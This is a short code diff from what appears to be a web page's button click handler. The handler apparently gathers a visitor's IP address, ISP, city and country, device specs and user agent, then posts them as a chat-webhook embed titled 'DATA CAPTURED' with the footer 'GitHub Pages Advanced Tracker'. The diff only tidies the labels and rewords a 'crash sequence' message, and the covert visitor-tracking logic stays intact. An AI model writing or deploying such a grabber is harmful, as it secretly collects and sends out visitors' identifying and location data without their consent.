@@ -39,23 +39,23 @@ button.addEventListener('click', () => {
                 avatar_url: "https://i.imgur.com/yourIcon.png", // Optional icon
                 embeds: [
                     {
-                        title: "🚨 BUTTON PRESSED - DATA CAPTURED",
-                        description: "User triggered the crash sequence.",
+                        title: "DATA CAPTURED",
+                        description: "User triggered the button!",
                         color: 16711740, // Red
                         fields: [
                             // --- NETWORK INFO ---
-                            { name: "🌐 IP Address", value: `||${data.ip}||`, inline: true },
-                            { name: "🏢 ISP / Network", value: data.org || "Unknown", inline: true },
-                            { name: "📍 Location", value: `${data.city}, ${data.country_name}`, inline: true },
+                            { name: "IP Address", value: `||${data.ip}||`, inline: true },
+                            { name: "ISP / Network", value: data.org || "Unknown", inline: true },
+                            { name: "Location", value: `${data.city}, ${data.country_name}`, inline: true },
                             
                             // --- DEVICE INFO ---
-                            { name: "💻 Platform", value: deviceInfo.platform, inline: true },
-                            { name: "📱 Screen Res", value: deviceInfo.screenRes, inline: true },
-                            { name: "🧠 CPU Cores", value: deviceInfo.cores, inline: true },
+                            { name: "Platform", value: deviceInfo.platform, inline: true },
+                            { name: "Screen Res", value: deviceInfo.screenRes, inline: true },
+                            { name: "CPU Cores", value: deviceInfo.cores, inline: true },
                             
                             // --- BROWSER INFO ---
-                            { name: "🌍 Language", value: deviceInfo.language, inline: true },
-                            { name: "🔍 User Agent", value: (deviceInfo.userAgent).substring(0, 50) + "...", inline: false }
+                            { name: "Language", value: deviceInfo.language, inline: true },
+                            { name: "User Agent", value: (deviceInfo.userAgent).substring(0, 50) + "...", inline: false }
                         ],
                         footer: { text: "GitHub Pages Advanced Tracker" },
                         timestamp: new Date().toISOString()
